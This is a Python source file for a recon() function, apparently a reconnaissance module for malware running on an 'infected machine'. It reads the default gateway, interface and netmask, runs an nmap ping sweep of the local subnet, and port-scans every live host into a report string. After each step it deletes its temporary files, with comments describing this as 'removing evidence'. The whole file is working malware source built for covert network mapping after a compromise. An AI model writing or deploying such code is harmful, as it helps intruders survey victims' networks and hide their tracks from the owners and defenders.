#Recon 

import os
from netaddr import IPAddress
import socket
import fcntl
import struct

def recon():
	#Getting the default gateway and interface
	os.system("ip route | grep default > def.txt")		

	mask = ""			#netmask of infected machine
	intf = ""			#interface used of infected machine
	gateway = ""		#default gateway of infected machine

	#we get the default gateway and interface from here
	with open("def.txt") as f:
		for line in f:
			
			s = line.split()
			 
			if len(s) < 5:
				continue
				
			gateway = s[2]
			intf = s[4]

	#removing evidence		
	os.system("rm def.txt")

	#Getting the netmask from the default interface	
	#command = "ifconfig " + intf + " " + "| grep -o 'Mask:[^\s]*' | cut -d':' -f2 > net.txt"
	
	#os.system(command)
		
	
	#with open ("net.txt") as f:
	#	for line in f:
	#		
	#		s = line.split()
	#		
	#		if len(s) < 1:
	#			continue
	#			
	#		mask = s[0]
			
	##removing evidence
	#os.system("rm net.txt")
	mask = str(socket.inet_ntoa(fcntl.ioctl(socket.socket(socket.AF_INET, socket.SOCK_DGRAM), 35099, struct.pack('256s', intf))[20:24]))
	
	#Netmask to cidr ex. 255.255.255.0 > 24		
	cidr = sum([bin(int(x)).count("1") for x in mask.split(".")])
	
	#split the gateway by '.'
	hold = gateway.split(".")
	
	
	holder = int(hold[3])
	
	#Gateway is generally the second IP address in a subnet range
	#Therefore, we to start at the IP adress minus one from the gateway IP
	if holder > 0:
		holder = holder - 1
	
	#Put together the starting address	
	start_a = hold[0] + "." + hold[1] + "." + hold[2] + "." + str(hold[3])
	
	#Append the cidr
	net_c = start_a + "/" + str(cidr)
	
	#new command will be nmap -sP starting_ip/cidr
	#This will ping all addresses in the network, and see if there is a response
	command = "nmap -sP " + net_c + " > nmap.txt"
	
	os.system(command)
	online_hosts = []
	ip_hold = ""
	flag = 0
	
	with open ("nmap.txt") as f:
		for line in f:
			
			s = line.split()
		
			if len(s) < 5:
				continue
		
			if s[2] == "up":
				online_hosts.append(ip_hold)
			
			ip_hold = s[4]
		
	#removing evidence	
	os.system("rm nmap.txt")
	
	ret_str = ""
	
	for x in range (len(online_hosts)):
	
		if online_hosts[x] == gateway:
			continue
		
	
		command = "nmap --top-ports 10 " + online_hosts[x] + " > xxxx.txt"
		os.system(command)
		fl = 0
		ret_str = ret_str + "Host: " + online_hosts[x] + " is online. Top ten open ports report:\n"
		with open("xxxx.txt") as f:
			for line in f:
			
				s = line.split()
				if len(s) == 0:
					continue
				
				if s[0] == "PORT":
					fl = 1
				
				if s[0] == "Nmap":
					fl = 0
					
				if fl == 1:
					ret_str = ret_str + line + "\n"
					
		os.system("rm xxxx.txt")
		
		command = "nmap " + online_hosts[x] + " > xxyy.txt"
		os.system(command)
		fla = 0
	
		ret_str = ret_str + "Report for other open ports:\n"
	
		with open("xxyy.txt") as f:
			for line in f:
				
				s = line.split()
				
				if len(s) == 0:
					continue
	
				if s[0] == "PORT":
					fla = 1
				if s[0] == "Nmap":
					fla = 0
					
				if fla == 1:
					ret_str = ret_str + line + "\n"
		
		os.system("rm xxyy.txt")
		ret_str = ret_str + "Report for " + online_hosts[x] + " has finished\n"
		ret_str = ret_str + "*************************\n"
		
	return ret_str	


